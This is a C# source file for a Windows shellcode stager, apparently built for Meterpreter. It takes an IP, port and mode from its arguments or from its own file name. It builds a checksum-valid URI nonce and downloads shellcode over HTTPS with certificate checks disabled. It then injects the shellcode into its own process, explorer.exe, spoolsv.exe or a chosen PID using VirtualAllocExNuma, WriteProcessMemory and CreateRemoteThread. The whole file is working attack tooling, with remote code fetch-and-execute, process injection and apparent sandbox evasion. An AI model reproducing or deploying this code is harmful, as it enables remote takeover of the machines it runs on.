using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Diagnostics;
using System.Threading;
using System.Linq;
using System.IO;

public class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 MEM_COMMIT_RESERVE = 0x3000;
    private static UInt32 PAGE_READWRITE = 0x4;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static char[] d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();


    public static void Main(string[] args)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, MEM_COMMIT_RESERVE, 0x3000, PAGE_READWRITE, 0);
        if (mem == null)
        {
            return;
        }

        string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
        string mode;
        string ip;
        string port;
        int pid = 0;
        Process[] expProc;

        // Set default values
        //mode = "run";
        string[] pathSplit = path.Split('\\');
        string exeName = pathSplit[pathSplit.Length - 1];
        string opts = Path.GetFileNameWithoutExtension(exeName);

        if (args == null || args.Length == 0)
        {
            string[] options = opts.Split('_');

            if (options.Length < 3)
            {
                print_help();
                return;
            }

            mode = options[0];
            ip = options[1];
            port = options[2];
        }
        else if (args.Length >= 3)
        {
            mode = args[0];
            ip = args[1];
            port = args[2];

            if (args.Length == 4)
            {
                pid = int.Parse(args[3]);
            }
        }
        else
        {
            print_help();
            return;
        }

        switch (mode)
        {
            case "run":
                pid = Process.GetCurrentProcess().Id;
                break;
            case "injectexp":
                expProc = Process.GetProcessesByName("explorer");
                pid = expProc[0].Id;
                break;
            case "injectspool":
                expProc = Process.GetProcessesByName("spoolsv");
                pid = expProc[0].Id;
                break;
            case "injectpid":
                try
                {
                    pid = Int32.Parse(args[3]);
                }
                catch
                {
                    print_help();
                    return;
                }
                break;
            default:
                print_help();
                return;
        }


        string nonce = G();
        Console.WriteLine(String.Format("[+] Nonce Found! {0}", nonce));

        string url = String.Format("https://{0}:{1}/{2}", ip, port, nonce);
        Console.WriteLine(String.Format("[+] Final URL: {0}", url));
        byte[] shellcode = Stager(url);

        IntPtr handle = Runner(shellcode, pid);

        if (pid == Process.GetCurrentProcess().Id)
        {
            WaitForSingleObject(handle, 0xFFFFFFFF);
        }


    }

    public static bool C(string v)
    {
        int sum = 0;
        foreach (int c in v.ToCharArray())
        {
            sum += c;
        }
        return sum % 256 == 92;
    }

    public static void E(ref char[] x)
    {
        Random rnd = new Random();
        int n = x.Length;
        while (n > 1)
        {
            int q = rnd.Next(n--);
            char y = x[n];
            x[n] = x[q];
            x[q] = y;
        }
    }

    public static string T()
    {
        Random rnd = new Random();
        string f = "";
        for (int i = 1; i < 57; i++)
        {
            f += d[rnd.Next(d.Length)];
        }
        return f;
    }

    public static string G()
    {
        for (int i = 0; i < 64; i++)
        {
            string h = T();
            char[] k = d;
            E(ref k);
            foreach (char l in k)
            {
                string s = h + l;
                if (C(s))
                {
                    return s;
                }
            }
        }
        return "nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
    }

    // Find the nonce in the URL and load the shellcode


    public static void print_help()
    {
        Console.WriteLine("Argumentless Usage: Mode_IP_Port");
        Console.WriteLine("Usage: Stager.exe Mode IP Port PID");
        Console.WriteLine("Mode: Mode of operation. Can be run, injectexp, injectspool, injectpid");
        Console.WriteLine("run: Runs met in curent process. injectexp: Injects into explorer and then runs. injectspool: injects spoolsv and then runs. injectpid: Injects a specific PID");
        Console.WriteLine("IP: The IP or hostname of the HTTPS handler listener. E.g. 192.168.1.1 or corp.com");
        Console.WriteLine("Port: The port the listener is on. Defaults to 443 if none is provided");
        Console.WriteLine("PID: Process ID to inject, eg 1234 (only used in injectpid mode)");
    }

    public static byte[] Stager(string url)
    {

        WebClient client = new WebClient();
        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        Console.WriteLine("[+] Beginning download.");
        byte[] shellcode = client.DownloadData(url);

        Console.WriteLine("[+] Download complete!");
        return shellcode;


    }

    public static IntPtr Runner(byte[] shellcode, int pid)
    {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE, 0);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
        IntPtr threadHandle = IntPtr.Zero;
        IntPtr threadId = IntPtr.Zero;
        IntPtr parameter = IntPtr.Zero;
        Console.WriteLine("[+] Executing.");
        threadHandle = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, parameter, 0, ref threadId);
        return threadHandle;
    }
}